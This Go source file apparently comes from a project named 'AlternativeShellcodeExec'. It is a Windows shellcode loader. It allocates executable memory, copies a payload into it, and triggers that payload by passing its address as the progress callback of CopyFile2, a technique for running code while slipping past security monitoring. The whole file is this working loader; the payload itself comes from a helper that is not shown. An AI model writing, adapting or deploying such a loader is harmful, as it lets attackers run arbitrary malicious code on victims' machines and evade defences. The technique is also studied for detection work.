package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

// ok
const (
	MEM_COMMIT               = 0x1000
	PAGE_EXECUTE_READWRITE   = 0x40
	COPY_FILE_FAIL_IF_EXISTS = 0x1
)

type COPYFILE2_EXTENDED_PARAMETERS struct {
	dwSize            uint32
	dwCopyFlags       uint32
	pfCancel          uintptr
	pProgressRoutine  uintptr
	pvCallbackContext uintptr
}

func Run(op []byte) {
	kernel32 := syscall.MustLoadDLL("kernel32.dll")

	virtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	rtlcMoveMemory := kernel32.MustFindProc("RtlMoveMemory")
	copyFile2 := kernel32.MustFindProc("CopyFile2")
	deleteFileW := kernel32.MustFindProc("DeleteFileW")

	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
	_, _, _ = rtlcMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&op[0])), uintptr(len(op)))

	params := COPYFILE2_EXTENDED_PARAMETERS{
		dwSize:            uint32(unsafe.Sizeof(COPYFILE2_EXTENDED_PARAMETERS{})),
		dwCopyFlags:       COPY_FILE_FAIL_IF_EXISTS,
		pfCancel:          0,
		pProgressRoutine:  uintptr(addr),
		pvCallbackContext: 0,
	}

	srcPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\DirectX.log")
	destPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\Temp\\backup.log")

	_, _, _ = deleteFileW.Call(uintptr(unsafe.Pointer(destPath)))
	_, _, _ = copyFile2.Call(uintptr(unsafe.Pointer(srcPath)), uintptr(unsafe.Pointer(destPath)), uintptr(unsafe.Pointer(&params)))

	fmt.Println("Done.")
}

func main() {
	Run(util.ShellCode())
}
